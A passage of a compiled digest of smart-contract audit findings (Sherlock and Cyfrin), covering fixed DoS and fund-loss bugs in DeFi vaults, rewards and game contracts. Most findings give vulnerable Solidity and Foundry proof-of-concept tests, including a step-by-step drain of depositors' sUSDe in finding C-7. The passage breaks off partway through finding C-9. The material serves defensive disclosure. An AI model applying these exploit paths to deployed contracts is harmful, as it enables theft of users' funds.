# lending / error-handling

- Count: `2`
- Definition: error path handling is too strict or missing, causing avoidable reverts/system blockage.

## [Notional][M-25] `getWithdrawRequestValue()` revert can brick account actions
- Severity: `Medium`
- Source: [Issue #779](https://github.com/sherlock-audit/2025-06-notional-exponent-judging/issues/779)
- Impact: `dos`

### Detailed Content
- Summary: `getWithdrawRequestValue()` iterates all pool tokens and enforces `require(hasRequest)` for each lookup.
- Root Cause: strict all-token request assumption with no graceful handling for zero-balance tokens where request is legitimately absent.
- Trigger Conditions: one token exits with zero amount so request manager does not create request entry for that token.
- Impact Detail: valuation function reverts; dependent `price()` reads fail and can brick exit/repay/withdraw/liquidation actions for account.

### Fix Status
- `Fixed/Resolved in report`

## [USG-Tangent][M-14] Edge-case IR math reaches `log_2(0)` and reverts
- Severity: `Medium`
- Source: [Issue #727](https://github.com/sherlock-audit/2025-08-usg-tangent-judging/issues/727)
- Impact: `dos`

### Detailed Content
- Summary: IR calculation edge case passes zero into logarithm in fixed-point math path.
- Root Cause: integer division truncation to zero before `ABDKMath64x64.divu`/`_pow` pipeline; later `log_2(0)` hard-reverts.
- Trigger Conditions: oracle price approaches configured upper boundary where numerator is positive but smaller than denominator after integer division.
- Impact Detail: all workflows requiring `_computeIR()` can revert, creating broad temporary DoS.

### Fix Status
- `Fixed/Resolved in report`

## Cyfrin Fixed Issues (Merged)
- Count: `109`
- Filter: `Severity in {Critical, Medium}` and explicit `Fixed/Resolved markers`
- Source: `cyfrin/*.md`

## [C-2] Critical DOS in queue processing if async cancellations are allowed
- Severity: `Critical`
- Source report: `accountable.md`

### Detailed Content (from source)
**Description:** The `cancelRedeemRequest()` function can be used to DOS the queue processing (ie. `processUpToShares()` and `processUpToRequestID()` can be made to revert).

This is the attack path :
- `cancelRedeemRequest()` marks `state.pendingCancelRedeemRequest = true`;
- Assume that this cancellation is not instantly fulfilled, as the associated strategy may support async cancellations


```solidity
    function cancelRedeemRequest(uint256 requestId, address controller) public onlyAuth {
        _checkController(controller);
        VaultState storage state = _vaultStates[controller];
        if (state.pendingRedeemRequest == 0) revert NoPendingRedeemRequest();
        if (state.pendingCancelRedeemRequest) revert CancelRedeemRequestPending();

        state.pendingCancelRedeemRequest = true;

        bool canCancel = strategy.onCancelRedeemRequest(address(this), controller); // @audit strategy can choose to return false here, thus mandating async cancellations.
        if (canCancel) {
            uint256 pendingShares = state.pendingRedeemRequest;

            _fulfillCancelRedeemRequest(uint128(requestId), controller);
            _reduce(controller, pendingShares);
        }
        emit CancelRedeemRequest(controller, requestId, msg.sender);
    }
```



- At this step, it also skips "reducing" the shares in request state, as _reduce() will only be called when cancellation is fulfilled via `fulfillCancelRedeemRequest()`
- Later when `processUpToShares()` is called, `_processRequest()` returns normal request data (does not return "zero values" as request.shares was not reduced in the cancel logic ) => so it doesn't break the loop or continue with nextRequestID
- It goes on to call `_fulfillRedeemRequest()`, where it reverts due to pendingCancelRedeemRequest = true

```solidity
    function _fulfillRedeemRequest(uint128 requestId, address controller, uint256 shares, uint256 price)
        internal
        override
    {
        VaultState storage state = _vaultStates[controller];
        if (state.pendingRedeemRequest == 0) revert NoRedeemRequest();
        if (state.pendingRedeemRequest < shares) revert InsufficientAmount();
        if (state.pendingCancelRedeemRequest) revert RedeemRequestWasCancelled();  // @audit
```

This means even a single async cancellation (that is pending for processing) can DOS queue processing.


**Impact:** Queue processing can be repeatedly DOS'ed under normal operations as well as by an attacker frontrunning a process call, in case the strategy contract allows async cancellations.


**Recommended Mitigation:** Consider removing async cancellations' support from the system, which prevents this kind of attacks.

**Accountable:** Fixed in commit [`2eeb273`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/2eeb2736eb5ba8dafa2c9f2f458b31fd8eb2d6bf)

**Cyfrin:** Verified. Async cancelation of redeem requests now removed.

## [C-3] Division by zero in rewards distribution can cause permanent lock of epoch rewards
- Severity: `Critical`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** In the `Rewards::_calculateOperatorShare()` function, the system fetches the current list of asset classes but attempts to calculate rewards for a historical epoch:

```solidity
function _calculateOperatorShare(uint48 epoch, address operator) internal {
    // ... uptime checks ...

    uint96[] memory assetClasses = l1Middleware.getAssetClassIds(); // @audit Gets CURRENT asset classes
    for (uint256 i = 0; i < assetClasses.length; i++) {
        uint256 operatorStake = l1Middleware.getOperatorUsedStakeCachedPerEpoch(epoch, operator, assetClasses[i]);
        uint256 totalStake = l1Middleware.totalStakeCache(epoch, assetClasses[i]); // @audit past epoch
        uint16 assetClassShare = rewardsSharePerAssetClass[assetClasses[i]];

        uint256 shareForClass = Math.mulDiv(
            Math.mulDiv(operatorStake, BASIS_POINTS_DENOMINATOR, totalStake), // ← DIVISION BY ZERO
            assetClassShare,
            BASIS_POINTS_DENOMINATOR
        );
        totalShare += shareForClass;
    }
}
```

 This creates a mismatch where:

- Deactivated asset classes remain in the returned array but have zero total stake
- Newly added asset classes are included but have no historical stake data for past epochs
- Asset classes with zero stake for any reason cause division by zero

Consider following scenario:

```text
- Epoch N: Normal operations, operators earn rewards, rewards distribution pending
- Epoch N+1: Protocol admin legitimately adds a new asset class for future growth
- Epoch N+2: New asset class is activated and configured with rewards share
- Epoch N+3: When attempting to distribute rewards for Epoch N, the system:

- Fetches current asset classes (including the new one)
- Attempts to get totalStakeCache[N][newAssetClass] which is 0
- Triggers division by zero in Math.mulDiv(), causing transaction revert
```

Similar division by zero checks are also missing in `_calculateAndStoreVaultShares` when `operatorActiveStake == 0`.


**Impact:** Adding a new asset class ID, deactivating or migrating an existing asset class ID or simply having zero stake for a specific assetClassId (though unlikely with minimum stake requirement but this is not enforced actively) are all instances where reward distribution can be permanently DOSed for a specific epoch.


**Proof of Concept:** Note: Test needs following changes to `MockAvalancheL1Middleware.sol`:

```solidity
 uint96[] private assetClassIds = [1, 2, 3]; // Initialize with default asset classes

    function setAssetClassIds(uint96[] memory newAssetClassIds) external {
        // Clear existing array
        delete assetClassIds;

        // Copy new asset class IDs
        for (uint256 i = 0; i < newAssetClassIds.length; i++) {
            assetClassIds.push(newAssetClassIds[i]);
        }
    }

    function getAssetClassIds() external view returns (uint96[] memory) {
        return assetClassIds;
    }  //@audit this function is overwritten
```

Copy following test to `RewardsTest.t.sol`:

```solidity
    function test_RewardsDistribution_DivisionByZero_NewAssetClass() public {
    uint48 epoch = 1;
    _setupStakes(epoch, 4 hours);

    vm.warp((epoch + 1) * middleware.EPOCH_DURATION());

    // Add a new asset class (4) after epoch 1 has passed
    uint96 newAssetClass = 4;
    uint96[] memory currentAssetClasses = middleware.getAssetClassIds();
    uint96[] memory newAssetClasses = new uint96[](currentAssetClasses.length + 1);
    for (uint256 i = 0; i < currentAssetClasses.length; i++) {
        newAssetClasses[i] = currentAssetClasses[i];
    }
    newAssetClasses[currentAssetClasses.length] = newAssetClass;

    // Update the middleware to return the new asset class list
    middleware.setAssetClassIds(newAssetClasses);

    // Set rewards share for the new asset class
    vm.prank(REWARDS_MANAGER_ROLE);
    rewards.setRewardsShareForAssetClass(newAssetClass, 1000); // 10%

     // distribute rewards
     vm.warp((epoch + 2) * middleware.EPOCH_DURATION());
    assertEq(middleware.totalStakeCache(epoch, newAssetClass), 0, "New asset class should have zero stake for historical epoch 1");

    vm.prank(REWARDS_DISTRIBUTOR_ROLE);
    vm.expectRevert(); // Division by zero in Math.mulDiv when totalStake = 0
    rewards.distributeRewards(epoch, 1);
}
```

**Recommended Mitigation:** Consider adding division by zero checks and simply move to the next asset if `total stake == 0` for a given assetClassId. Also add zero checks to `operatorActiveStake == 0` when calculating `vaultShare`

**Suzaku:**
Fixed in commit [9ac7bf0](https://github.com/suzaku-network/suzaku-core/pull/155/commits/9ac7bf0dc8071b42e4621d453d52227cfc27a03f).

**Cyfrin:** Verified.

## [C-4] `PaymentSettler` can change `stablecoin` but `RemoraToken` can't resulting in corrupted state with DoS for core functions
- Severity: `Critical`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** `RemoraToken` has a `stablecoin` member with a comment that indicates it must match `PaymentSettler`:
```solidity
address public stablecoin; //make sure same stablecoin is used here that is used in payment settler
```

But in the updated code there is no way to update `RemoraToken::stablecoin`; previously `DividendManager` which `RemoraToken` inherits from had a `changeStablecoin` function but this was commented out with the introduction of `PaymentSettler`.

`PaymentSettler` has a `stablecoin` member and a function to change it:
```solidity
address public stablecoin;

function changeStablecoin(address newStablecoin) external restricted {
    if (newStablecoin == address(0)) revert InvalidAddress();
    stablecoin = newStablecoin;
}
```

**Impact:** When `PaymentSettler` changes its `stablecoin` it will now be different to `RemoraToken::stablecoin` which can't be changed, corrupting the state causing key functions to revert.

**Proof Of Concept:**
```solidity
function test_changeStablecoin_inconsistentState() external {
    address newStableCoin = address(new Stablecoin("USDC", "USDC", 0, 6));

    // change stablecoin on PaymentSettler
    paySettlerProxy.changeStablecoin(newStableCoin);
    assertEq(paySettlerProxy.stablecoin(), newStableCoin);

    // now inconsistent with RemoraToken
    assertEq(remoraTokenProxy.stablecoin(), address(stableCoin));
    assertNotEq(paySettlerProxy.stablecoin(), remoraTokenProxy.stablecoin());

    // no way to update RemoraToken::stablecoin
}
```

**Recommended Mitigation:** Enforce that `RemoraToken` and `PaymentSettler` must always refer to the same `stablecoin`. When implementing this consider our other findings where changing the `stablecoin` to one with different decimals corrupts protocol accounting.

The simplest solution may be to remove `stablecoin` from `RemoraToken` completely and have `PaymentSettler` perform all the necessary transfers.

**Remora:** Fixed in commit [ced21ba](https://github.com/remora-projects/remora-smart-contracts/commit/ced21ba9758b814eb48a09a5e792aa89cc87e8f5) by removing `stablecoin` from `RemoraToken`, moving the transfer fee logic into `PaymentSettler` and having `RemoraToken` call `PaymentSettler::settleTransferFee`.

**Cyfrin:** Verified.

\clearpage

## [C-5] `PledgeManager::pledge`, `refundTokens` will revert due to overflow when `pricePerToken * numTokens > type(uint32).max`
- Severity: `Critical`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** `PledgeManager::pledge` multiplies two `uint32` variables and stores the result into a `uint256`, attempting to account for when the multiplication returns a value greater than `type(uint32).max`:
```solidity
uint256 stablecoinAmount = pricePerToken * numTokens; // account for overflow
```

`PledgeManager::refundTokens` does the same thing:
```solidity
uint256 refundAmount = numTokens * pricePerToken; //TOOD: overflow check
```

However this won't work correctly since if the result of the multiplication is greater than `type(uint32).max` the function will revert.

**Impact:** The maximum value of `uint32` is 4294967295. Since `pricePerToken` uses 6 decimals, the maximum possible `stablecoinAmount` is $4294.96 which is very low; pledging will be revert for many reasonable amounts that users will want to do.

The contract is also not upgradeable so this can't be fixed via upgrading.

**Proof of Concept:** You can easily verify this behavior using [chisel](https://getfoundry.sh/chisel/overview):
```solidity
$ chisel
Welcome to Chisel! Type `!help` to show available commands.
➜ uint32 a = type(uint32).max;
➜ uint32 b = 10;
➜ uint256 c = a * b;
Traces:
  [401] 0xBd770416a3345F91E4B34576cb804a576fa48EB1::run()
    └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)

Error: Failed to execute REPL contract!
```

**Recommended Mitigation:** Firstly consider increasing the size of `pricePerToken` and `numTokens`, since the max value of `uint32` is 4,294,967,295 which means:
* for price with 6 decimals, the maximum `pricePerToken` is $4294 which may be too small
* the maximum token amount is 4.29B which may work or also be too small
* simple solution: standardize all protocol token amounts to `uint128`

Secondly instead of multiplying two smaller types such as `uint32`, cast one of them to `uint256`:
```diff
- uint256 stablecoinAmount = pricePerToken * numTokens; // account for overflow
+ uint256 stablecoinAmount = uint256(pricePerToken) * numTokens;
```

Verify the fix via chisel:
```solidity
$ chisel
Welcome to Chisel! Type `!help` to show available commands.
➜ uint32 a = type(uint32).max;
➜ uint32 b = 10;
➜ uint256 c = uint256(a) * b;
➜ c
Type: uint256
├ Hex: 0x9fffffff6
├ Hex (full word): 0x00000000000000000000000000000000000000000000000000000009fffffff6
└ Decimal: 42949672950
```

Consider these lines in `TokenBank::buyToken` whether a similar fix is needed there:
```solidity
// @audit can `amount * curData.pricePerToken * curData.saleFee > type(uint64).max`? If so then
// consider making a similar fix here to prevent overflow revert
        uint64 stablecoinValue = amount * curData.pricePerToken;
        uint64 feeValue = (stablecoinValue * curData.saleFee) / 1e6;
```

**Remora:** Fixed in commits [a0b277f](https://github.com/remora-projects/remora-smart-contracts/commit/a0b277fe4a59354f3b3783c4b8c06eb60f5157610), [ced21ba](https://github.com/remora-projects/remora-smart-contracts/commit/ced21ba9758b814eb48a09a5e792aa89cc87e8f5).

**Cyfrin:** Verified.

## [C-6] Distribution of payouts will revert due to overflow when payment is made using a stablecoin with high decimals
- Severity: `Critical`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** Payouts are meant to be paid using a stablecoin, originally a stablecoin with 6 decimals (USDC). But the system has the capability of changing the stablecoin that is used for payments. Could be USDT (8 decimals), USDS (18 decimals).

As part of the changes made to introduce the PaymentSettler, the data type of the variable [`calculatedPayout` was changed from a uint256 to a uint64](https://github.com/remora-projects/remora-smart-contracts/blob/audit/Dacian/contracts/RWAToken/DividendManager.sol#L42). This change introduces a critical vulnerability that can cause an irreversible DoS to users to collect their payouts.

A uint64 would revert when distributing a payout of 20 USD using a stablecoin of 18 decimals.
- As we can see on chisel, 20e18 is > the max value a uint64 can fit
```
➜ bool a = type(uint64).max > 20e18;
➜ a
Type: bool
└ Value: false
```

For example, there is a user who has 5 distributions pending to be calculated, and in the most recent distribution, the distribution is paid with a stablecoin of 18 decimals. (assume the user is earning 50USD on each distribution)
- When the user attempts to calculate its payout, the tx will revert because the last distribution will take the user's payout beyond the value that can fit in a uint64, so, when [safeCasting the payout down to a uint64](https://github.com/remora-projects/remora-smart-contracts/blob/audit/Dacian/contracts/RWAToken/DividendManager.sol#L435-L440), an overflow will occur, and tx will blow up, resulting in this user getting DoS from claiming not only the most recent payout, but all the previous payouts that haven't been calculated yet.

```solidity
    function payoutBalance(address holder) public returns (uint256) {
        ...
        for (uint16 i = payRangeStart; i >= payRangeEnd; --i) {
            ...

            PayoutInfo memory pInfo = $._payouts[i];
//@audit => `pInfo.amount` set using a stablecoin with high decimals will bring up the payoutAmount beyond the limit of what can fit in a uint64
            payoutAmount +=
                (curEntry.tokenBalance * pInfo.amount) /
                pInfo.totalSupply;
            if (i == 0) break; // to prevent potential overflow
        }
        ...
        if (payoutForwardAddr == address(0)) {
//@audit-issue => overflow will blow up the tx
            holderStatus.calculatedPayout += SafeCast.toUint64(payoutAmount);
        } else {
//@audit-issue => overflow will blow up the tx
            $._holderStatus[payoutForwardAddr].calculatedPayout += SafeCast
                .toUint64(payoutAmount);
        }
```

**Impact:** Irreversible DoS to holders' payouts distribution.

**Recommended Mitigation:** To solve this issue, the most straightforward fix is to change the data type of `calculatePayout` to at least `uint128` & consider standardizing all token amounts to `uint128`.

But, this time it is recommended to go one step further and normalize the internal accounting of the system to a fixed number of decimals in such a way that it won't be affected by the decimals of the actual stablecoin that is being used to process the payments.

As part of this change, the `PaymentSettler` contract must be responsible for converting the values sent and received from the RemoraToken to the actual decimals of the current configured stablecoin.

**Remora:** Fixed in commits [a0b277f](https://github.com/remora-projects/remora-smart-contracts/commit/a0b277fe4a59354f3b3783c4b8c06eb60f5157610), [ced21ba](https://github.com/remora-projects/remora-smart-contracts/commit/ced21ba9758b814eb48a09a5e792aa89cc87e8f5).

**Cyfrin:** Verified.

## [C-7] An attacker can drain the entire protocol balance of sUSDe during the yield phase due to incorrect redemption accounting logic in `pUSDeVault::_withdraw`
- Severity: `Critical`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** After transitioning to the yield phase, the entire protocol balance of USDe is deposited into sUSDe and pUSDe can be deposited into the yUSDe vault to earn additional yield from the sUSDe. When initiating a redemption, `yUSDeVault::_withdraw` is called which in turn invokes `pUSDeVault::redeem`:

```solidity
    function _withdraw(address caller, address receiver, address owner, uint256 pUSDeAssets, uint256 shares) internal override {
        if (!withdrawalsEnabled) {
            revert WithdrawalsDisabled();
        }

        if (caller != owner) {
            _spendAllowance(owner, caller, shares);
        }


        _burn(owner, shares);
@>      pUSDeVault.redeem(pUSDeAssets, receiver, address(this));
        emit Withdraw(caller, receiver, owner, pUSDeAssets, shares);
    }
```

This is intended to have the overall effect of atomically redeeming yUSDe -> pUSDe -> sUSDe by previewing and applying any necessary yield from sUSDe:

```solidity
    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal override {

            if (PreDepositPhase.YieldPhase == currentPhase) {
                // sUSDeAssets = sUSDeAssets + user_yield_sUSDe
@>              assets += previewYield(caller, shares);

@>              uint sUSDeAssets = sUSDe.previewWithdraw(assets); // @audit - this rounds up because sUSDe requires the amount of sUSDe burned to receive assets amount of USDe to round up, but below we are transferring this rounded value out to the receiver which actually rounds against the protocol/yUSDe depositors!

                _withdraw(
                    address(sUSDe),
                    caller,
                    receiver,
                    owner,
                    assets, // @audit - this should not include the yield, since it is decremented from depositedBase
                    sUSDeAssets,
                    shares
                );
                return;
            }
        ...
    }
```

However, by incrementing `assets` in the case where this is a yUSDe redemption and there has been yield accrued by sUSDe, this will attempt to decrement the `depositedBase` state by more than intended:

```solidity
    function _withdraw(
            address token,
            address caller,
            address receiver,
            address owner,
            uint256 baseAssets,
            uint256 tokenAssets,
            uint256 shares
        ) internal virtual {
            if (caller != owner) {
                _spendAllowance(owner, caller, shares);
            }
@>          depositedBase -= baseAssets; // @audit - this can underflow when redeeming yUSDe because previewYield() increments assets based on sUSDe preview but this decrement should be equivalent to the base asset amount that is actually withdrawn from the vault (without yield)

            _burn(owner, shares);
            SafeERC20.safeTransfer(IERC20(token), receiver, tokenAssets);
            onAfterWithdrawalChecks();

            emit Withdraw(caller, receiver, owner, baseAssets, shares);
            emit OnMetaWithdraw(receiver, token, tokenAssets, shares);
        }
```

If the incorrect state update results in an unexpected underflow then yUSDe depositors may be unable to redeem their shares (principal + yield). However, if a faulty yUSDe redemption is processed successfully (i.e. if the relative amount of USDe underlying pUSDe is sufficiently large compared to the total supply of yUSDe and the corresponding sUSDe yield) then pUSDe depositors will erroneously and unexpectedly redeem their shares for significantly less USDe than they originally deposited. This effect will be magnified by subsequent yUSDe redemptions as the `total_yield_USDe` will be computed as larger than it is in reality due to `depositedBase` being much smaller than it should be:

```solidity
    function previewYield(address caller, uint256 shares) public view virtual returns (uint256) {
        if (PreDepositPhase.YieldPhase == currentPhase && caller == address(yUSDe)) {
            uint total_sUSDe = sUSDe.balanceOf(address(this));
            uint total_USDe = sUSDe.previewRedeem(total_sUSDe);

@>          uint total_yield_USDe = total_USDe - Math.min(total_USDe, depositedBase);
            uint y_pUSDeShares = balanceOf(caller);

            uint caller_yield_USDe = total_yield_USDe.mulDiv(shares, y_pUSDeShares, Math.Rounding.Floor);

            return caller_yield_USDe;
        }
        return 0;
    }
```

This in turn causes `depositedBase` to be further decremented until it is eventually tends to zero, impacting all functionality that relies of the overridden `totalAssets()`. Given that it is possible to inflate the sUSDe yield by either transferring USDe directly or waiting to sandwich a legitimate yield accrual (since `sUSDe::previewRedeem` does not account for the vesting schedule) this allows an attacker to completely devastate the pUSDe/yUSDe accounting, redeeming their yUSDe for close to the entire protocol sUSDe balance at the expense of all other depositors.

**Impact:** Significant loss of user funds.

**Proof of Concept:**
```solidity
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {MockUSDe} from "../contracts/test/MockUSDe.sol";
import {MockStakedUSDe} from "../contracts/test/MockStakedUSDe.sol";
import {MockERC4626} from "../contracts/test/MockERC4626.sol";

import {pUSDeVault} from "../contracts/predeposit/pUSDeVault.sol";
import {yUSDeVault} from "../contracts/predeposit/yUSDeVault.sol";

import {console2} from "forge-std/console2.sol";

contract CritTest is Test {
    uint256 constant MIN_SHARES = 0.1 ether;

    MockUSDe public USDe;
    MockStakedUSDe public sUSDe;
    pUSDeVault public pUSDe;
    yUSDeVault public yUSDe;

    address account;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        address owner = msg.sender;

        // Prepare Ethena and Ethreal contracts
        USDe = new MockUSDe();
        sUSDe = new MockStakedUSDe(USDe, owner, owner);

        // Prepare pUSDe and Depositor contracts
        pUSDe = pUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new pUSDeVault()),
                    abi.encodeWithSelector(pUSDeVault.initialize.selector, owner, USDe, sUSDe)
                )
            )
        );

        yUSDe = yUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new yUSDeVault()),
                    abi.encodeWithSelector(yUSDeVault.initialize.selector, owner, USDe, sUSDe, pUSDe)
                )
            )
        );

        vm.startPrank(owner);
        pUSDe.setDepositsEnabled(true);
        pUSDe.setWithdrawalsEnabled(true);
        pUSDe.updateYUSDeVault(address(yUSDe));

        // deposit USDe and burn minimum shares to avoid reverting on redemption
        uint256 initialUSDeAmount = pUSDe.previewMint(MIN_SHARES);
        USDe.mint(owner, initialUSDeAmount);
        USDe.approve(address(pUSDe), initialUSDeAmount);
        pUSDe.mint(MIN_SHARES, address(0xdead));
        vm.stopPrank();

        if (pUSDe.balanceOf(address(0xdead)) != MIN_SHARES) {
            revert("address(0xdead) should have MIN_SHARES shares of pUSDe");
        }
    }

    function test_crit() public {
        uint256 aliceDeposit = 100 ether;
        uint256 bobDeposit = 2 * aliceDeposit;

        // fund users
        USDe.mint(alice, aliceDeposit);
        USDe.mint(bob, bobDeposit);

        // alice deposits into pUSDe
        vm.startPrank(alice);
        USDe.approve(address(pUSDe), aliceDeposit);
        uint256 aliceShares_pUSDe = pUSDe.deposit(aliceDeposit, alice);
        vm.stopPrank();

        // bob deposits into pUSDe
        vm.startPrank(bob);
        USDe.approve(address(pUSDe), bobDeposit);
        uint256 bobShares_pUSDe = pUSDe.deposit(bobDeposit, bob);
        vm.stopPrank();

        // setup assertions
        assertEq(pUSDe.balanceOf(alice), aliceShares_pUSDe, "Alice should have shares equal to her deposit");
        assertEq(pUSDe.balanceOf(bob), bobShares_pUSDe, "Bob should have shares equal to his deposit");

        {
            // phase change
            account = msg.sender;
            uint256 initialAdminTransferAmount = 1e6;
            vm.startPrank(account);
            USDe.mint(account, initialAdminTransferAmount);
            USDe.approve(address(pUSDe), initialAdminTransferAmount);
            pUSDe.deposit(initialAdminTransferAmount, address(yUSDe));
            pUSDe.startYieldPhase();
            yUSDe.setDepositsEnabled(true);
            yUSDe.setWithdrawalsEnabled(true);
            vm.stopPrank();
        }

        // bob deposits into yUSDe
        vm.startPrank(bob);
        pUSDe.approve(address(yUSDe), bobShares_pUSDe);
        uint256 bobShares_yUSDe = yUSDe.deposit(bobShares_pUSDe, bob);
        vm.stopPrank();

        // simulate sUSDe yield transfer
        uint256 sUSDeYieldAmount = 100 ether;
        USDe.mint(address(sUSDe), sUSDeYieldAmount);

        {
            // bob redeems from yUSDe
            uint256 bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);
            vm.prank(bob);
            yUSDe.redeem(bobShares_yUSDe/2, bob, bob);
            uint256 bobRedeemed_sUSDe = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;
            uint256 bobRedeemed_USDe = sUSDe.previewRedeem(bobRedeemed_sUSDe);

            console2.log("Bob redeemed sUSDe (1): %s", bobRedeemed_sUSDe);
            console2.log("Bob} redeemed USDe (1): %s", bobRedeemed_USDe);

            // bob can redeem again
            bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);
            vm.prank(bob);
            yUSDe.redeem(bobShares_yUSDe/5, bob, bob);
            uint256 bobRedeemed_sUSDe_2 = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;
            uint256 bobRedeemed_USDe_2 = sUSDe.previewRedeem(bobRedeemed_sUSDe);

            console2.log("Bob redeemed sUSDe (2): %s", bobRedeemed_sUSDe_2);
            console2.log("Bob redeemed USDe (2): %s", bobRedeemed_USDe_2);

            // bob redeems once more
            bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);
            vm.prank(bob);
            yUSDe.redeem(bobShares_yUSDe/6, bob, bob);
            uint256 bobRedeemed_sUSDe_3 = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;
            uint256 bobRedeemed_USDe_3 = sUSDe.previewRedeem(bobRedeemed_sUSDe);

            console2.log("Bob redeemed sUSDe (3): %s", bobRedeemed_sUSDe_3);
            console2.log("Bob redeemed USDe (3): %s", bobRedeemed_USDe_3);
        }

        console2.log("pUSDe balance of sUSDe after bob's redemptions: %s", sUSDe.balanceOf(address(pUSDe)));
        console2.log("pUSDe depositedBase after bob's redemptions: %s", pUSDe.depositedBase());

        // alice redeems from pUSDe
        uint256 aliceBalanceBefore_sUSDe = sUSDe.balanceOf(alice);
        vm.prank(alice);
        uint256 aliceRedeemed_USDe_reported = pUSDe.redeem(aliceShares_pUSDe, alice, alice);
        uint256 aliceRedeemed_sUSDe = sUSDe.balanceOf(alice) - aliceBalanceBefore_sUSDe;
        uint256 aliceRedeemed_USDe = sUSDe.previewRedeem(aliceRedeemed_sUSDe);

        console2.log("Alice redeemed sUSDe: %s", aliceRedeemed_sUSDe);
        console2.log("Alice redeemed USDe: %s", aliceRedeemed_USDe);
        console2.log("Alice lost %s USDe", aliceDeposit - aliceRedeemed_USDe);

        // uncomment to observe the assertion fail
        // assertApproxEqAbs(aliceRedeemed_USDe, aliceDeposit, 10, "Alice should redeem approximately her deposit in USDe");
    }
}
```

**Recommended Mitigation:** While the assets corresponding to the accrued yield should be included when previewing the sUSDe withdrawal, only the base assets should be passed to the subsequent call to `_withdraw()`:

```diff
function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal override {

        if (PreDepositPhase.YieldPhase == currentPhase) {
            // sUSDeAssets = sUSDeAssets + user_yield_sUSDe
--          assets += previewYield(caller, shares);
++          uint256 assetsPlusYield = assets + previewYield(caller, shares);

--          uint sUSDeAssets = sUSDe.previewWithdraw(assets);
++          uint sUSDeAssets = sUSDe.previewWithdraw(assetsPlusYield);

            _withdraw(
                address(sUSDe),
                caller,
                receiver,
                owner,
                assets
                sUSDeAssets,
                shares
            );
            return;
        }
    ...
}
```

**Strata:** Fixed in commit [903d052](https://github.com/Strata-Money/contracts/commit/903d0528eedf784a34a393bd9210adb28451b27c).

**Cyfrin:** Verified. Yield is no longer included within the decremented assets amount and the test now passes with the assertion included.

\clearpage
## High Risk

## [C-8] Impossible for user to get refund after re-joining a rescheduled game which is subsequently cancelled
- Severity: `Critical`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** Impossible for user to get refund after re-joining a rescheduled game which is subsequently cancelled.

**Impact:** The user's fee for joining the game is permanently locked inside the immutable `SessionManager` contract.

**Proof of Concept:** Add the PoC to `SessionManagerLeaveGame.t.sol`:
```solidity
function test_gameRescheduled_Leave_JoinAgain_GameCancelled_UserRefundReverts() public {
    // create a game
    uint256 timeAfterRescheduling = sessionManager.minimumRescheduleTime();
    _createGame();
    uint256 rescheduleDelta = type(uint256).max - sessionManager.getStartTime(1);

    // user joins the game
    uint256 gameId = 1;
    uint256 gameFee = 10 ether;
    address user = contestants[0];
    uint256 startTime = sessionManager.getStartTime(gameId);
    vm.startPrank(user);
    TestUSDC(usdc).approve(address(sessionManager), gameFee);
    sessionManager.joinGame(gameId);
    vm.stopPrank();

    // game gets rescheduled
    sessionManager.rescheduleGame(1, startTime + rescheduleDelta);
    vm.warp(block.timestamp + timeAfterRescheduling);

    // user leaves rescheduled game
    vm.prank(user);
    sessionManager.leaveRescheduledGame(gameId);

    // user got refunded the game fee
    assertEq(TestUSDC(usdc).balanceOf(user), gameFee);
    assertEq(TestUSDC(usdc).balanceOf(address(sessionManager)), 0 ether);

    // user decides to re-join the game
    vm.startPrank(user);
    TestUSDC(usdc).approve(address(sessionManager), gameFee);
    sessionManager.joinGame(gameId);
    vm.stopPrank();

    // user decides to leave again; impossible
    vm.expectRevert(); // AlreadyRefunded(0xd52E4d00E363cB91d9051fBFDC80c292a1da630B, 1)]
    vm.prank(user);
    sessionManager.leaveRescheduledGame(gameId);

    // game is cancelled
    sessionManager.cancelGame(gameId);

    // impossible for user to get a refund!
    vm.expectRevert(); // AlreadyRefunded(0xd52E4d00E363cB91d9051fBFDC80c292a1da630B, 1)]
    vm.prank(user);
    sessionManager.refundCancelledGame(gameId);

    // user's game fee is permanently stuck in the session manager contract!
    assertEq(TestUSDC(usdc).balanceOf(user), 0);
    assertEq(TestUSDC(usdc).balanceOf(address(sessionManager)), gameFee);
}
```

**Recommended Mitigation:** In `DepositManager::_payEntryFee` add this:
```solidity
// reset user refunded status when joining the game; this allows
// users to get refunded if they rejoin a game which later gets cancelled
if(hasRefunded[gameId][player]) hasRefunded[gameId][player] = false;
```

**Majestic Games:**
Fixed in commit [3ac5654](https://github.com/Engage-Protocol/engage-protocol/commit/3ac565495df69ba8936be9d3d91a77eeb639b366) by not allowing users who have been refunded to rejoin the same game.

**Cyfrin:** Verified.

## [C-9] Impossible to claim rewards when ranked rewards or number of winners are not set, resulting in permanently locked tokens once game has concluded
- Severity: `Critical`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** `FixedRanksReward::setRankedRewards` enforces that ranked rewards can only be set when the game is in the `Created` state:
```solidity
    function setRankedRewards(uint256 sessionId, uint256[] calldata _rankedRewards) external {
        require(sessionManager.getSessionState(sessionId) == SessionState.Created, NotCreated(sessionId));
```

The same is also true for `ProportionalToXPReward::setNumberOfWinners`.

But `SessionManager::startAndRevealGameQuestion` will happily start the game without ranked rewards / number of winners being set, and the game will progress all the way to the final `Concluded` state, giving the appearance that everything is OK.

